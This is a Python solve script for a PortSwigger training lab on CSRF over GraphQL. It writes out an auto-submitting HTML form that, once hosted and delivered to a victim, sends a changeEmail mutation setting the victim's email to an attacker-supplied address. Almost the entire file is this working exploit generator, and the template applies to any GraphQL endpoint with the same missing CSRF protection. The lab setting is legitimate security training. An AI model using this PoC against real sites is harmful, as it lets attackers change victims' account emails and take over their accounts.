#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Performing CSRF exploits over GraphQL.

The /graphql/v1 endpoint accepts application/x-www-form-urlencoded.
This allows cross-origin form submissions to trigger mutations (CSRF).
The changeEmail mutation has no CSRF token protection.

This script generates the CSRF PoC HTML to host on the exploit server.
"""

import argparse


CSRF_TEMPLATE = """\
<html>
  <body>
    <form action="{endpoint}" method="POST">
      <input type="hidden" name="query" value="mutation changeEmail{{changeEmail(input:{{email:&quot;{email}&quot;}}){{email}}}}">
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>
"""


def generate_poc(lab_url, attacker_email):
    endpoint = f"{lab_url.rstrip('/')}/graphql/v1"
    html = CSRF_TEMPLATE.format(endpoint=endpoint, email=attacker_email)
    filename = "csrf_poc.html"
    with open(filename, "w") as f:
        f.write(html)
    print(f"[+] CSRF PoC written to {filename}")
    print(f"[*] Host it on the exploit server and deliver to victim.")
    print(f"\n--- PoC HTML ---\n{html}")


def main():
    parser = argparse.ArgumentParser(
        description="Generate CSRF PoC for GraphQL changeEmail mutation"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("attacker_email", help="Email to change victim's address to")
    args = parser.parse_args()

    generate_poc(args.lab_url, args.attacker_email)


if __name__ == "__main__":
    main()
